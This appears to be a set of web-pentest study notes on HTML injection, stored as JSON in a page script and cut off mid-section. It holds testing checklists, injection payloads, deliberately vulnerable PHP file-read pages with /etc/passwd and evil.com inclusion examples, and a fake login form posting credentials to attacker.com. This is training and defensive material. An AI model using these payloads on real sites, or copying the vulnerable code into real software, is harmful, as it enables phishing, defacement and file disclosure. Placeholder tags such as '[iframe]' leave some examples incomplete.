<script>
var NOTES = [{"name": "Final HTML Injection Testing Checklist", "content": "# Final HTML Injection Testing Checklist\n\n---\n### 1. **Find Unknown GET/POST Parameters**\n\nIdentify hidden or undocumented parameters that the backend accepts. Use Burp Intruder or custom wordlists with common parameter names like `user`, `name`, `id`, `q`, etc.\n\n```\n?test=<h1>Injected</h1>\n```\n\n**Explanation:**\n- Applications often have parameters that are not visible in the HTML or JavaScript but are still processed on the server.\n- By brute-forcing parameter names, you may find hidden inputs that are not sanitized, which can lead to HTML injection.\n\n---\n### 2. **Test All Form Fields (Including Hidden Fields)**\n\nEnter `</h2><p>Injected</p><!--` or `<h1>Injected</h1>` in every form field to check if the value is rendered in the response without sanitization.  \n\n**Explanation:**\n- Developers may validate only some inputs and ignore hidden fields.    \n- By targeting both visible and hidden form inputs, you can identify where user input directly reflects in the HTML output.\n\n---\n### 3. **Test All Relevant HTTP Headers**\n\nSend test payloads in headers:\n\n```\nX-Forwarded-For: <h1>Injected</h1>\nX-ProxyUser-IP: <p>Injected</p>\nReferer: <img src=x onerror=alert(1)>\nUser-Agent: <h2>Injected</h2>\n```\n\n**Explanation:**\n- Some web apps log or display headers for debugging or analytics.\n- If a header is directly reflected in the HTML without sanitization, it becomes a valid HTML injection vector.\n\n---\n### 4. **Array Injection**\n\nSend array-like inputs to bypass regex or type checks.\n\n```\n?user[]=test\n?user[0]=safe&user[1]=<h1>Injected</h1>\n```\n\n**Explanation:**\n- PHP automatically converts array-like inputs into arrays.\n- If the backend expects a string, regex-based filters may break, and unsafe array elements may be output without validation.\n\n---\n### 5. **Parameter Pollution (HPP)**\n\nSend the same parameter multiple times or mix GET/POST:\n\n```\n?user=safe&user=<h1>Injected</h1>\ncurl -X POST \"http://site/page.php?user=safe\" -d \"user=<h1>Injected</h1>\"\n```\n\n**Explanation:**\n- PHP merges GET, POST, and COOKIE parameters using `$_REQUEST`.\n- Depending on `request_order`, it may pick the last or first value.\n- This can bypass security checks if one value is validated but another value is used for output.\n\n---\n### 6. **Cookie Parameter Injection**\n\nSend injection payloads in cookies:\n\n```\nCookie: user=<h1>Injected</h1>\n```\n\n**Explanation:**\n- In some configurations, cookies in `$_REQUEST` are treated like GET/POST parameters.\n- If cookies are not sanitized, HTML injection is possible even without query parameters.\n\n---\n### 7. **Unicode and Encoding Bypasses**\n\nUse special Unicode characters or alternate encoding forms:\n\n```\n?user=%E2%80%8B<h1>Injected</h1>\n?user=＜h1＞Injected＜/h1＞\n```\n\n**Explanation:**\n- Many filters only look for `<` and `>` in their ASCII form.\n- By using Unicode equivalents or invisible characters, you can bypass blacklists.\n\n---\n### 8. **Null Byte Injection**\n\nInject null bytes in input:\n\n```\n?user=test%00<h1>Injected</h1>\n```\n\n**Explanation:**\n- Older PHP versions truncate input at null bytes.\n- This can bypass validation logic and allow injecting HTML that was previously stripped.\n\n---\n### 9. **Double URL Encoding**\n\nDouble-encode payloads to bypass single-pass filters:\n\n```\n?user=%253Ch1%253EInjected%253C%2Fh1%253E\n```\n\n**Explanation:**\n- If the server decodes input multiple times, `%253C` (double-encoded `<`) becomes `<`.\n- This bypasses filters applied only in the first decoding pass.\n\n---\n### 10. **Character Set Manipulation**\n\nUse alternative character encodings:\n\n```bash\ncurl -X POST \"http://site/page.php\" \\\n     -H \"Content-Type: application/x-www-form-urlencoded; charset=utf-7\" \\\n     -d \"user=+ADw-h1+AD4-Injected+ADw-/h1+AD4-\"\n```\n\n**Explanation:**\n- UTF-7 and other exotic charsets can make browsers or servers interpret `<` and `>` even if they are encoded differently.\n\n---\n### 11. **Multipart Form Data**\n\nSend payloads with multipart encoding:\n\n```bash\ncurl -X POST \"http://site/page.php\" \\\n     -F \"user=<h1>Injected</h1>\"\n```\n\n**Explanation:**\n- If backend regex or sanitization is applied only to `application/x-www-form-urlencoded`, using `multipart/form-data` can bypass it.\n\n---\n### 12. **Length/Memory Attacks**\n\nUse extremely long inputs to break filters:\n\n```\n?user=aaaa...(thousands)...aaaa<h1>Injected</h1>\n```\n\n**Explanation:**\n- Some regex engines fail or skip validation with overly long inputs.\n- This allows malicious HTML to pass through.\n\n---\n### 13. **PHP Magic Quotes Legacy (Rare)**\n\nTest old escaping quirks:\n\n```\n?user=test\\<h1\\>Injected\\</h1\\>\n```\n\n**Explanation:**\n- On very old PHP setups (pre-5.4), `magic_quotes` may escape characters incorrectly.\n- This may allow injection through unexpected input transformations.\n\n---\n---"}, {"name": "OFFENSIVE PAYLOADS", "content": "# Html-Injection-Payload\n\n## HTML Injection Payload to Change Background Color for Body\n\nTo change the background color of the `<body>` element using an HTML injection payload, you can inject an inline `<style>` tag or use an inline `[script]\nExplanation:\nThis script executes immediately and changes the background color of the page.\n\n3. Event Attribute Injection (if attributes are possible)\nUsing onload in the <body> tag\nhtml\nCopy code\n<body onload=\"document.body.style.background='red'\">\nUsing an injected attribute in another tag\nhtml\nCopy code\n<img src=x onerror=\"document.body.style.background='red'\">\nExplanation:\nThe JavaScript runs when the event (onload or onerror) is triggered.\n\nUsage Notes\nPayload success depends on where the input is injected and how input validation or sanitization is implemented.\n\nBackground colors can be changed using:\n\nNamed colors: red, blue, green\n\nHex values: #ff0000, #00ff00, #0000ff\n\nRGB values: rgb(255,0,0)"}, {"name": "Read file vulneriblity", "content": "## Vulnerable Code Review: html-injection-read-file.php\n\n```php\nhtml-injection-read-file.php\n```\nThis PHP page reads and outputs the content of a file based on a user-supplied `filename` parameter, introducing a **Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)** vulnerability.\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Html Injection Read File</title>\n</head>\n<body>\n\n<pre>\n<?php\n$filename = $_GET['filename'];\n\necho readfile($filename);\n?>\n</pre>\n\n</body>\n</html>\n```\n\n## Example URLs:\n\n```php\nhttp://192.168.1.45/webpentest/html-injection-read-file.php?filename=index.html\n```\n\n```php\nhttp://192.168.1.45/webpentest/html-injection-read-file.php?filename=/var/www/html/index.html\n```\n\n```php\nhttp://192.168.1.45/webpentest/html-injection-read-file.php?filename=/var/www/html/phpinfo.php\n```\n\n```php\nhttp://192.168.1.45/webpentest/html-injection-read-file.php?filename=https://www.armourinfosec.com/index.php\n```\n\n```php\nhttp://192.168.1.45/webpentest/html-injection-read-file.php?filename=https://www.armourinfosec.com/robots.txt\n```\n\n## Vulnerability Details:\n\n• The `filename` parameter is passed **directly** to PHP `readfile()` without any validation or sanitization.\n• This allows an attacker to:\n  • Read **any local file** readable by the webserver, such as `/etc/passwd`, configuration files, or source code.\n  • Read **remote files** via URLs if `allow_url_fopen` is enabled, effectively leaking remote resources.\n• This can lead to disclosure of sensitive information or server compromise.\n \n## Exploitation Examples:\n\n**Local file read:**\n\n```\n?filename=/etc/passwd\n```\n\n**Remote file inclusion (if enabled):**\n\n```\n?filename=http://evil.com/malicious.txt\n```\n\n#### Security Implications:\n\n• **Information disclosure:** Sensitive server files, credentials, private keys.\n• **Potential Remote Code Execution:** If combined with other vulnerabilities or improperly executed.\n• **Data leakage:** Leaking internal source files or environment information.\n\n**Recommended security measures :**\n\n• Validate and restrict input to allowed filenames or directories only.\n• Disable remote file operations (e.g., `allow_url_fopen=Off`).\n• Use safe file APIs or whitelists.\n• Avoid echoing potentially large or sensitive files directly.\n\n---\n## Vulnerable Code Review: html-injection-read-file2.php\n\n```php\nhtml-injection-read-file2.php\n```\n\nThis PHP page reads and outputs the content of a local file based on a user-supplied selection from a dropdown menu.\n\n```html\n<!DOCTYPE html>\n\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Html Injection Read File 2</title>\n</head>\n<body>\n\n<h1>Html Injection Read File 2</h1>\n\n<form action=\"html-injection-read-file2.php\" method=\"POST\">\n    <label for=\"cars\">Choose a File:</label>\n    <select name=\"filename\" id=\"filename\">\n        <option value=\"index.html\">index.html</option>\n        <option value=\"robots.txt\">robots.txt</option>\n    </select>\n    <br><br>\n    <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\n<pre>\n<?php\nif (isset($_POST['submit'])) {\n    $filename = $_POST['filename'];\n    echo readfile($filename);\n}\n?>\n</pre>\n\n</body>\n</html>\n```\n\n## Vulnerability Details:\n\n• Although the file list is **restricted to two options** ( `index.html` and `robots.txt` ), the value is directly used in `readfile()` without any additional validation.\n• An attacker with the ability to manipulate POST data could potentially bypass the dropdown and send an arbitrary filename via crafted requests.\n• This can lead to **Local File Inclusion (LFI)** or **Local File Disclosure**, exposing sensitive data if files outside of the intended set are readable by the web server.\n\n## Example Attack Vector:\n\nA malicious user could send a POST request with:\n\n```\nfilename=../../../../etc/passwd\n```\n\nand if the file is readable, its content will be displayed.\n\n## Security Considerations:\n\n• Whitelist filenames on the server side strictly, not relying only on client-side UI controls.\n• Validate and sanitize all user input.\n• Consider restricting file reads to a specific directory.\n• Avoid outputting the raw content directly, or sanitize output.\n\n----\n## Vulnerable Code Review: html-injection-read-file3.php\n\nThis PHP code reads and outputs the content of a file based on a `filename` GET parameter, restricted via a regex pattern.\n\n```bash\nhtml-injection-read-file3.php\n```\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Html Injection Read File 3</title>\n</head>\n<body>\n\n<pre>\n<?php\n$filename = $_GET['filename'];\n\n// Regex allows letters, numbers, underscores, slashes, dots, ending with \".txt\"\nif (preg_match('/^[a-zA-Z0-9_\\/\\.]+\\.txt$/', $filename)) {\n    echo readfile($filename);\n}\n?>\n</pre>\n\n</body>\n</html>\n```\n\n• **Example usage:**\n\n```\nhttp://192.168.1.45/webpentest/html-injection-read-file3.php?filename=robots.txt\n```\n\n## Vulnerability Details:\n\n• The regex restricts input to files with names containing only alphanumeric characters, underscores, slashes, dots, and requires the filename to end with `.txt`.\n• This prevents some malicious filenames but **still allows directory traversal** via `../` sequences since dots and slashes are allowed.\n• For example, `filename=../../../../etc/passwd.txt` would pass the regex (assuming the file exists), potentially allowing reading of sensitive files with `.txt` extension.\n• This is a **Local File Inclusion (LFI)** vulnerability via insufficient input validation.\n\n## Potential Attack Example:\n\n• Reading sensitive files with `.txt` suffix or symbolic links:\n\n```\nfilename=../../../../etc/passwd.txt\n```\n\nAlthough `/etc/passwd` typically does not have `.txt` extension, an attacker may find or create `.txt` files or symbolic links that expose sensitive data.\n\n## Recommendations :\n\n• Disallow or sanitize traversal sequences such as `../`.\n• Restrict files to a dedicated directory without allowing relative paths.\n• Use a whitelist of allowed filenames.\n• Avoid outputting raw file content without sanitization.\n\n---\n## Vulnerable Code Review: html-injection-read-file4.php\n\nThe intended vulnerability remains: it attempts to restrict file reads to a whitelist, but the check logic can be improved. The overall structure allows reading only selected files, but subtle issues remain.\n\n```php\nhtml-injection-read-file4.php\n```\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Html Injection Read File 4</title>\n</head>\n<body>\n\n<h1>Html Injection Read File 2</h1>\n\n<form action=\"html-injection-read-file4.php\" method=\"POST\">\n    <label for=\"cars\">Choose a File:</label>\n    <select name=\"filename\" id=\"filename\">\n        <option value=\"index.html\">index.html</option>\n        <option value=\"robots.txt\">robots.txt</option>\n    </select>\n    <br><br>\n    <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\n<?php\nif (isset($_POST['submit'])) {\n    \n    $filename = $_POST['filename'];\n    \n    $files = array('index.html', 'robots.txt');\n    \n    // preg_grep returns array of matches; non-empty means found\n    if (preg_grep(\"/^$filename$/\", $files)) {\n        echo readfile($filename);\n    } else {\n        echo \"Error\";\n    }\n}\n?>\n\n</body>\n</html>\n```\n\n## Explanation & Vulnerability Analysis:\n\n• **Whitelist approach:** The script uses a whitelist array `$files = ['index.html', 'robots.txt']` which contains allowed filenames.\n• **Matching logic:** It uses `preg_grep(\"/^$filename$/\", $files)` to check if `$filename` exists in that whitelist, ignoring case.\n\n## Subtle Issues:\n\n• **Regex injection risk:** The `$filename` value is used directly inside the regex pattern without escaping, which could lead to an unexpected regex interpretation if `$filename` contains regex special characters.\n  • Example: If an attacker manages to inject regex metacharacters, it could match unintended filenames or bypass the whitelist check.\n• **Case-insensitivity:** The `i` flag makes the check case-insensitive, which is usually good.\n• **Strictness:** The check only confirms if any whitelist item matches the pattern containing `$filename`, meaning partial matching is possible.\n\n## Demonstration:\n\n```\npreg_grep(\"/index.html/i\", \\$files); // Matches exactly \"index.html\"\npreg_grep(\"/index/i\", \\$files);      // Also matches \"index.html\", which may not be intended if partial input provided\n```\n\n• Since the input is from the dropdown, the risk is low for normal users, but crafted POST requests could manipulate `$filename`.\n## Potential Improvements :\n\n• Escape regex special characters in `$filename` before using in `preg_grep` to prevent regex injection.\n\n```php\n$escaped = preg_quote($filename, '/');\nif (preg_grep(\"/^$escaped$/i\", \\$files)) { ... }\n```\n\n• Use exact matching instead of partial regex match to strictly compare values.\n• Additional server-side validation to prevent manipulation outside of allowed values.\n\n## Summary:\n\n• The file whitelist mechanism attempts to limit file reads to known safe files.\n• The use of `preg_grep()` with unescaped user input as regex pattern introduces a **regex injection risk**.\n• An attacker could potentially exploit this to bypass the whitelist.\n• The actual file read ( `readfile($filename)` ) directly outputs file contents with no output sanitization (no encoding), so any file read will be displayed raw.\n• Since the selection is from a dropdown, the UI limits input, but POST requests can be manually crafted to exploit this.\n\n---\n## Vulnerable Code Review: html-injection-read-file5.php\n\nThe logic strictly checks if the filename is exactly `\"index.html\"` or `\"robots.txt\"` before calling `readfile()`. Despite this whitelist check, the code remains vulnerable to information disclosure and lacks output sanitization. Also, it relies solely on the client POST request for filename selection, which can be manipulated.\n\n```php\nhtml-injection-read-file5.php\n```\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Html Injection Read File 4</title>\n</head>\n<body>\n\n<h1>Html Injection Read File 2</h1>\n\n<form action=\"html-injection-read-file5.php\" method=\"POST\">\n    <label for=\"cars\">Choose a File:</label>\n    <select name=\"filename\" id=\"filename\">\n        <option value=\"index.html\">index.html</option>\n        <option value=\"robots.txt\">robots.txt</option>\n    </select>\n    <br><br>\n    <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\n<?php\nif (isset($_POST['submit'])) {\n    $filename = $_POST['filename'];\n    \n    if ($filename === \"index.html\" || $filename === \"robots.txt\") {\n        echo readfile($filename);\n    } else {\n        echo \"Error\";\n    }\n}\n?>\n\n</body>\n</html>\n```\n\n## Notes on Vulnerability\n\n• **Whitelist check:**\n  The code permits only two exact filenames ( `index.html` or `robots.txt` ) from the POST data to be read.\n\n• **Client-side control:**\n  The filename value is still fully controllable by the client via modifying the POST request. Although restricted by the condition, an attacker can test if files exist or cause unwanted file reading by form tampering.\n\n• **No input sanitization beyond equality check:**\n  This control is good but minimal.\n\n• **No output sanitization or escaping:**\n  The output of `readfile()` goes directly to the page inside `<body>`. If these files contain HTML or script code, it will be rendered/executed in the user's browser.\n\n• **No error handling:**\n  If files are missing or unreadable, this is not handled explicitly.\n\n## Summary\n\n• This code has **improved whitelist validation** compared to previous versions.\n• It still allows reading predefined files based on untrusted POST input.\n• The reading of files is **unsanitized and directly printed**, possibly leading to:\n  • HTML injection (if file contains HTML)\n  • Information disclosure\n• As per your request, no fixing or escaping is applied, so the vulnerability remains.\n\n**Recommendation (outside of scope):**\nConsider encoding output ( `htmlspecialchars()` or similar) to prevent HTML injection from file contents and further restrict access control on files.\n\n---\n---\n\n# **NOTE:**\n\nIf internally some misconfigurations are there then \nfile read funcitons can allow read external resoures\n\n\n\nexample:\n\nThis can read the local file of the system \n```php\nhttp://192.168.1.29/web-pentest/html-injection-read-file.php?filename=/etc/passwd\n```\n\nBut this cal load the external website as a file\n```php\nhttp://192.168.1.29/web-pentest/html-injection-read-file.php?filename=https://armourinfosec.com\n```\n\n**Explanation**\n- The readfile() function reads a file and writes it to the output buffer.\n- **Tip:** You can use a URL as a filename with this function if the fopen wrappers have been enabled in the php.ini file.\n- In PHP, if **`allow_url_fopen = On`** in `php.ini`, then PHP functions that normally work with local files (`fopen`, `file_get_contents`, `readfile`, etc.) can also fetch **remote resources over HTTP, HTTPS, or FTP**."}, {"name": "html injection theory", "content": "# HTML Injection \n\n## Definition\n\nHTML Injection is a web vulnerability where attackers inject malicious HTML code into web pages. This happens when user input is displayed on a page without proper sanitization or encoding, allowing the browser to interpret injected HTML as legitimate code.\n\n## Types of HTML Injection\n\n### 1. Reflected HTML Injection\n- **Nature**: Temporary, non-persistent\n- **How**: Malicious HTML reflected immediately from URL/form\n- **Impact**: Affects only users who click malicious link\n- **Example**: \n\n```\nhttps://site.com/search?q=<h1>Hacked</h1>\n```\n\nThe search query gets reflected on the page without encoding\n\n### 2. Stored HTML Injection\n- **Nature**: Permanent, persistent in database\n- **How**: Malicious HTML saved on server\n- **Impact**: Affects ALL users viewing that content\n- **Example**: Comment system storing `[iframe]`\n- **More Dangerous**: Because it's permanent and affects multiple users\n\n## How Attack Works\n\n1. **Discovery**: Attacker finds input field (search, comment, profile)\n2. **Testing**: Tries basic HTML like `<b>test</b>`\n3. **Exploitation**: If HTML renders, injects malicious code\n4. **Impact**: Users see defaced content, fake forms, or worse\n\n### Attack Flow Example:\n\n```\nUser Input: <h1>FREE MONEY</h1><form action=\"http://steal.com\">...\n     ↓\nServer: Stores/reflects without encoding\n     ↓\nHTML Output: <div>Comment: <h1>FREE MONEY</h1><form>...</div>\n     ↓\nBrowser: Renders the injected HTML as real content\n```\n\n## Vulnerable vs Secure Code\n\n### PHP Examples\n```php\n// ❌ VULNERABLE - Direct output\necho \"Hello \" . $_GET['name'];\necho \"<div>$userComment</div>\";\n\n// ✅ SECURE - With encoding\necho \"Hello \" . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');\necho \"<div>\" . htmlspecialchars($userComment, ENT_QUOTES, 'UTF-8') . \"</div>\";\n```\n\n### JavaScript Examples\n```javascript\n// ❌ VULNERABLE - Using innerHTML\ndocument.getElementById('output').innerHTML = userInput;\ndocument.write(\"<h1>\" + userName + \"</h1>\");\n\n// ✅ SECURE - Using textContent\ndocument.getElementById('output').textContent = userInput;\n// Or sanitize if HTML needed\ndocument.getElementById('output').innerHTML = DOMPurify.sanitize(userInput);\n```\n\n## Common Attack Payloads\n\n### Basic UI Manipulation\n\n```html\n<h1>This Site is Hacked</h1>\n<marquee>Your computer has virus!</marquee>\n<style>body{display:none}</style>\n```\n\n### Phishing Attacks\n```html\n<!-- Fake login form -->\n<div style=\"position:fixed;top:0;left:0;width:100%;background:white;z-index:9999\">\n  <h2>Session Expired - Please Login</h2>\n  <form action=\"https://attacker.com/steal.php\">\n    <input name=\"user\" placeholder=\"Username\">\n    <input name=\"pass\" type=\"password\" placeholder=\"Password\">\n    <input type=\"submit\" value=\"Login\">\n  </form>\n</div>\n```\n\n### Content Injection\n```html\n<!-- Iframe to malicious site -->\n[iframe]\n\n<!-- Auto-redirect -->\n<meta http-equiv=\"refresh\" content=\"0;url=https://evil.com\">\n\n<!-- Fake alerts -->\n<h1 style=\"color:red\">⚠️ YOUR ACCOUNT WILL BE DELETED IN 24 HOURS!</h1>\n```\n\n### XSS Escalation\n```html\n<!-- If these work, it's also XSS -->\n<img src=x onerror=alert(document.cookie)>\n<svg onload=alert(1)>\n<input onfocus=alert(1) autofocus>\n```\n\n## Testing for HTML Injection\n\n### Manual Testing Steps\n1. **Find Input Points**: Forms, URL params, headers\n2. **Test Basic HTML**: \n   ```html\n   <b>bold</b>\n   <i>italic</i>\n   <u>underline</u>\n   ```\n3. **Check Output**: \n   - If text appears **bold/italic** → Vulnerable\n   - If you see `<b>bold</b>` as text → Safe\n4. **Try Advanced Payloads**:\n   ```html\n   <h1>test</h1>\n   [iframe]\n   <form><button>Click</button></form>\n   ```\n\n### Where to Test\n- Search boxes: `search.php?q=<h1>test</h1>`\n- User profiles: Name, Bio, Location fields\n- Comments/Forums\n- Contact forms\n- Error pages: `page.php?error=<h1>Error</h1>`\n- File upload names\n\n## Prevention Techniques\n\n### 1. Output Encoding (MOST IMPORTANT)\n\nConvert special characters to HTML entities:\n- `<` becomes `&lt;`\n- `>` becomes `&gt;`\n- `\"` becomes `&quot;`\n- `'` becomes `&#x27;`\n\n**PHP Implementation:**\n```php\n// Simple encoding\n$safe = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');\n\n// For URLs\n$safe_url = urlencode($input);\n```\n\n### 2. Context-Aware Encoding\nDifferent contexts need different encoding:\n```php\n// HTML context\n<div><?= htmlspecialchars($data) ?></div>\n\n// JavaScript context\n[script]\n\n// URL context\n<a href=\"page.php?id=<?= urlencode($data) ?>\">Link</a>\n\n// CSS context (be very careful)\n<style>.class { color: <?= preg_replace('/[^a-zA-Z0-9]/', '', $data) ?>; }</style>\n```\n\n### 3. Input Validation\n```php\n// Whitelist approach\nif (!preg_match('/^[a-zA-Z0-9\\s]{1,50}$/', $username)) {\n    die(\"Invalid username\");\n}\n\n// Length limits\nif (strlen($comment) > 1000) {\n    die(\"Comment too long\");\n}\n```\n\n### 4. Content Security Policy (CSP)\n```python\n# .htaccess or server config\nHeader set Content-Security-Policy \"default-src 'self'; script-src 'self'\"\n```\n\n### 5. Use Safe Libraries/Frameworks\n\n**For Rich Content (when you need some HTML):**\n\n```javascript\n// JavaScript - DOMPurify\nconst clean = DOMPurify.sanitize(dirty, {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],\n    ALLOWED_ATTR: ['href']\n});\n```\n\n```php\n// PHP - HTMLPurifier\n$config = HTMLPurifier_Config::createDefault();\n$purifier = new HTMLPurifier($config);\n$clean = $purifier->purify($dirty);\n```\n\n## HTML Injection vs XSS\n\n| Aspect | HTML Injection | XSS |\n|--------|---------------|-----|\n| **What's injected** | HTML tags (`<h1>`, `<form>`) | JavaScript code |\n| **Execution** | No script execution | Executes JavaScript |\n| **Example** | `<h1>Hacked</h1>` | `[script]` |\n| **Main Goal** | Deface, phish | Steal cookies, hijack session |\n| **Severity** | Medium-High | High-Critical |\n\n**Important**: HTML injection can become XSS if JavaScript execution is possible!\n\n---\n## Real-World Scenarios\n\n### Scenario 1: Forum Stored Injection\n```\n1. Attacker posts: [iframe]\n2. Post saved to database\n3. Every user viewing the thread sees fake bank site\n4. Users might enter credentials thinking it's legitimate\n```\n\n### Scenario 2: Search Reflected Injection\n```\n1. Attacker crafts: site.com/search?q=<form action=\"http://steal.com\">...\n2. Sends link to victim\n3. Victim clicks and sees fake form on trusted site\n4. Victim submits credentials to attacker\n```\n\n## Security Headers\nAdd these headers for extra protection:\n```apache\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: strict-origin-when-cross-origin\n```\n\n## Quick Testing Payloads\n```html\n<!-- Basic test -->\n<h1>XSS</h1>\n\n<!-- Style injection -->\n<style>body{background:red}</style>\n\n<!-- Form injection -->\n<form><input value=\"Click me\"></form>\n\n<!-- Advanced -->\n<svg>[script]</svg>\n<img src=x onerror=alert(1)>\n<body onload=alert(1)>\n```\n\n## Key Points to Remember\n\n1. **HTML Injection ≠ XSS** (but can lead to XSS)\n2. **Stored is worse than Reflected** (affects more users)\n3. **Always encode output**, not just filter input\n4. **Different contexts need different encoding**\n5. **Use htmlspecialchars() in PHP, textContent in JS**\n6. **Modern frameworks often handle this automatically**\n7. **Test both input and output points**\n8. **Rich text editors need special handling**\n\n## Common Mistakes Developers Make\n- Only filtering input, not encoding output\n- Using blacklists instead of whitelists\n- Forgetting about different contexts (HTML vs JS vs URL)\n- Trusting data from database (it might be poisoned)\n- Using innerHTML when textContent would work\n- Not testing with special characters\n\n## If You Find HTML Injection\n1. Check if JavaScript execution is possible (makes it XSS)\n2. Test if it's stored or reflected\n3. Identify all affected pages/parameters\n4. Document with proof-of-concept\n5. Report severity based on impact\n\n---\n---"}, {"name": "html injection vulneriblity", "content": "# HTML Injection Vulnerability Code\n---\n## Given html input by :\n1) url  parameter\n2) hidden parameter\n3) headers\n\n---\n## What is HTML Injection?\n---\n**HTML Injection** is a web security vulnerability that occurs when an application embeds user input directly into a web page's HTML structure without proper sanitization or encoding. This allows an attacker to inject arbitrary HTML tags or content, which the browser will interpret and render as part of the page.\n\n## How Does HTML Injection Happen?\n***\nHTML injection is possible whenever a web application takes untrusted data (such as content from a form, query parameter, or HTTP header) and inserts it into an HTML page without filtering out or encoding HTML special characters.\n\n### Example Vulnerable Code\n\n```php\n<?php\n    if (isset($_REQUEST['user'])) {\n        echo \"<h2>\" . $_REQUEST['user'] . \"!! </h2>\";\n    }\n?>\n```\nIf the attacker sets `user` to `[iframe]`, the browser will render the injected iframe.\n\n## Consequences of HTML Injection\n***\n*   **Page Defacement:** Attackers can change how the website looks for users.\n*   **Phishing:** Malicious forms or messages can be injected to trick users into revealing sensitive data.\n*   **Browser Exploitation:** Injected scripts or objects may target browser vulnerabilities.\n*   **Content Spoofing:** Attackers can display fake information to manipulate or deceive users.\n\n## Common Scenarios\n***\n\n| Context         | Example Attack                                             | Impact                        |\n| :-------------- | :--------------------------------------------------------- | :---------------------------- |\n| GET/POST inputs | `user=<h1>Hacked</h1>`                                     | Displays fake/injected header |\n| Form fields     | `<input name=\"name\" value=\"<?php echo $_GET['name']; ?>\">` | Breaks HTML or injects code   |\n| URL parameters  | `[iframe]\n```\n**Attack:**\n`?url=https://evil.com/`\n\nAny site can be loaded within the page, leading to clickjacking or phishing.\n\n## Why is HTML Injection Dangerous?\n***\n*   **Trust Exploitation:** Users may trust malicious content if it appears within a legitimate site.\n*   **Data Theft:** Attackers can steal credentials through fake forms or hidden fields.\n*   **Further Exploits:** Combined with browser bugs, could achieve script execution.\n\n## Prevention\n***\n*   **Sanitize user input:** Remove or encode HTML special characters (`<`, `>`, `&`, `\"`, `'`).\n*   **Context-aware output encoding:** Use functions like `htmlspecialchars()` or `htmlentities()` in PHP.\n*   **Whitelist values:** For URLs or other dynamic content, only permit trusted, predefined values.\n*   **Avoid inserting untrusted input directly into HTML, attributes, or script contexts.**\n\n## References\n***\nOWASP Web Security Testing Guide\n\thttps://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection\n\nHTML Character Reference\n\thttp://rabbit.eng.miami.edu/info/htmlchars.html\n\n---\n## Vulnerable Example: html-injection.php\n\n```python\nhtml-injection.php\n```\n\n```php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <title>Html Injection</title>\n</head>\n<body>\n    <h1>Html Injection</h1>\n    <?php\n        if (isset($_REQUEST['user'])) {\n            echo \"<h2>\" . $_REQUEST['user'] . \"!! </h2>\";\n        }\n    ?>\n    </body>\n</html>\n```\n\n> **Exploit Example:**\n> Open:\n> http://192.168.1.29/webpentest/html-injection.php?user=%3Ch1%3EInjected!%3C/h1%3E\n> The injected text is rendered as HTML.\n\n## Basic Login Form Example\n***\n```html\n<h1>Please Login</h1>\n<form action=\"#\" method=\"POST\">\n    User Name: <input type=\"text\" name=\"username\"><br />\n    Password: <input type=\"password\" name=\"password\"><br />\n    <input type=\"submit\" value=\"login\">\n</form>\n```\n\n---\n## Vulnerable Example: html-injection2.php\n\n```python\nhtml-injection2.php\n```\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <title>Html Injection 2</title>\n</head>\n<body>\n    <h1>Please Login</h1>\n    <form action=\"#\" method=\"POST\">\n        <input type=\"hidden\" name=\"sessionid\" value=\"<?php echo $_REQUEST['sessionid']; ?>\">\n        User Name: <input type=\"text\" name=\"username\"><br />\n        Password: <input type=\"password\" name=\"password\"><br />\n        <input type=\"submit\" value=\"login\">\n    </form>\n</body>\n</html>\n```\n\n> **Exploit Example:**\n> http://192.168.1.45/webpentest/html-injection2.php?sessionid=1234%22%3E%3Ch1%3EHello!%3C/h1%3E\n> The input escapes the attribute context and injects HTML.\n\n---\n## Vulnerable Example: html-injection3.php\n***\n```python\nhtml-injection3.php\n```\n\n```php\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <title>Html Injection 3</title>\n</head>\n<body>\n<?php\n    $user_agent = $_SERVER['HTTP_USER_AGENT'];\n    $user_ipadd = $_SERVER['REMOTE_ADDR'];\n    $user_port_no = $_SERVER['REMOTE_PORT'];\n    $user_ipadd2 = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : \"\";\n    $user_ipadd3 = isset($_SERVER['HTTP_X_PROXYUSER_IP']) ? $_SERVER['HTTP_X_PROXYUSER_IP'] : \"\";\n    $user_http_referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : \"\";\n?>\n    <h1>User Info</h1>\n    <table>\n        <tr>\n            <th>User Agent</th>\n            <th>User IP Add</th>\n            <th>User Port No</th>\n            <th>USER REFERER</th>\n        </tr>\n        <tr>\n            <td><?php echo $user_agent; ?></td>\n            <td><?php echo $user_ipadd; ?></td>\n            <td><?php echo $user_port_no; ?></td>\n            <td><?php echo $user_http_referer; ?></td>\n        </tr>\n    </table>\n    <?php echo $user_ipadd2; ?><br />\n    <?php echo $user_ipadd3; ?>\n</body>\n</html>\n```\n\n---\n## Blacklist-Based Filtering: 